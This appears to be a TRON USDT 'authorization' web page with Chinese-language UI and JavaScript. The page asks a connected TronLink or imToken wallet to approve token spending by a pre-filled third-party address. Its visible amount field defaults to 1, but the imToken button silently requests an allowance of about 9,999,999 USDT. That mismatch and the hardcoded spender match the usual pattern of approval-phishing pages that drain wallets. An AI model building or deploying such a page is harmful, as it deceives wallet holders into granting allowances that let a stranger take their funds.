<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>TRON USDT 授权</title>
  <style>
    body { font-family: Arial; padding: 20px; background: #f6f6f6; }
    input, button { padding: 8px; margin: 5px 0; width: 100%; }
    button { cursor: pointer; }
    #status { margin-top: 10px; font-weight: bold; }
  </style>
</head>
<body>

<h2>TRON USDT 授权页面</h2>

<p>合约地址: <span id="contractAddressDisplay">TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</span></p>

<label>授权地址:</label>
<input type="text" id="spenderAddress" value="TGyztuTE8f4FJte4JZ1VRDpEKYpKMAuQey">

<label>授权数量（USDT，1 = 1 TRC20 单位）:</label>
<input type="number" id="amount" value="1">

<button id="approveBtn">授权</button>
<button id="imtokenLinkBtn">用 IMToken 授权</button>

<div id="status"></div>

<script>
async function waitForTronWeb() {
  while (!window.tronWeb || !tronWeb.ready) {
    document.getElementById('status').innerText = '等待 TronLink 或 IMToken 登录...';
    await new Promise(resolve => setTimeout(resolve, 500));
  }
  document.getElementById('status').innerText = '钱包已登录!';
}

// 原生授权函数
async function approve() {
  const contractAddress = document.getElementById('contractAddressDisplay').innerText;
  const spender = document.getElementById('spenderAddress').value;
  const amount = document.getElementById('amount').value;

  if (!contractAddress || !spender || !amount) {
    alert('请填写完整信息');
    return;
  }

  try {
    const contract = await tronWeb.contract().at(contractAddress);
    const value = parseInt(amount) * 1_000_000; // 转为 TRC20 最小单位 (6位小数)
    
    document.getElementById('status').innerText = '等待交易签名...';

    const tx = await contract.approve(spender, value).send({
      feeLimit: 100_000_000,
      callValue: 0
    });

    document.getElementById('status').innerText = '授权成功！交易ID: ' + tx;
  } catch (e) {
    console.error(e);
    document.getElementById('status').innerText = '交易失败: ' + e.message;
  }
}

// IMToken 授权跳转（默认最大额度）
function imtokenAuthorize() {
  const contractAddress = document.getElementById('contractAddressDisplay').innerText;
  const spender = document.getElementById('spenderAddress').value;
  const maxAmount = 9_999_999 * 1_000_000; // 最大值 TRC20 最小单位

  const imtokenUrl = `imtokenv2://navigate?screen=dapp&url=https://example.com/authorize.html?contract=${contractAddress}&spender=${spender}&amount=${maxAmount}`;
  
  window.location.href = imtokenUrl;
}

waitForTronWeb();

document.getElementById('approveBtn').addEventListener('click', approve);
document.getElementById('imtokenLinkBtn').addEventListener('click', imtokenAuthorize);
</script>

</body>
</html>
